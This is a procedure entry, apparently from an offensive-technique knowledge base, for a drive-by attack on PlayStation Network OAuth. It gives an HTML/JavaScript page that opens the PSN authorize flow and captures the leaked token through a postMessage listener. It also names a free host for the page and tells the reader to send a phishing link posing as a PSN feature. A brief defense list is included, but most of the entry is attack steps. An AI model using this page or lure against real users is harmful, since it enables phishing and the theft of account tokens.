---
tags:
  - poc
  - malicious-page
  - javascript
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:35.034Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 20f719a4-574e-41aa-9777-f04737427109
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Navigate-to-Malicious-PoC-Page

## Summary

This procedure involves hosting and directing the victim to a malicious proof-of-concept (PoC) page that contains JavaScript to orchestrate the OAuth exploitation, setting up event listeners for token capture.

## Description

The PoC page is a simple HTML file with embedded JavaScript that uses window.open to trigger the PSN OAuth flow and window.onmessage to intercept the leaked token. Hosted on a free service like 000webhostapp.com, it mimics a legitimate site to lure the victim. The target environment is any modern web browser, and success depends on the victim having an active PSN session.

## Requirements

1. Hosting for malicious HTML/JS (e.g., free web host)
2. Victim access to the hosted URL
3. Browser supporting window.open and postMessage

## Defense

Defensive measures and detection strategies:

- Educate users on phishing and suspicious links
- Browser content security policies (CSP) to block inline scripts
- Network filters to block known malicious hosts

## Objectives

1. Load the attack infrastructure in victim's browser
2. Initialize token capture mechanisms
3. Maintain stealth until exploitation

## Instructions

### Step 1: Host the PoC Page

**Context**: Create and upload the HTML file with JS for window.open and onmessage.

Example HTML snippet:

```html
<!DOCTYPE html>
<html>
<body>
<button id="start">Start</button>
<div id="token-plate"></div>
<script>
window.onmessage = function(e) { document.getElementById('token-plate').innerText = e.data; };
document.getElementById('start').onclick = function() { window.open('https://auth.api.sonyentertainmentnetwork.com/2.0/oauth/authorize?...'); };
</script>
</body>
</html>
```

> Expected output: Page hosted at URL like http://nnez-poc.000webhostapp.com/e1f47833ad18d94a20780d81f8060c79.html.

### Step 2: Lure Victim to Page

**Context**: Use social engineering to get victim to visit the URL.

Send phishing link claiming it's a PSN-related feature.

> Expected output: Victim loads page; button visible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[poc]]
- [[malicious-page]]
- [[JavaScript]]
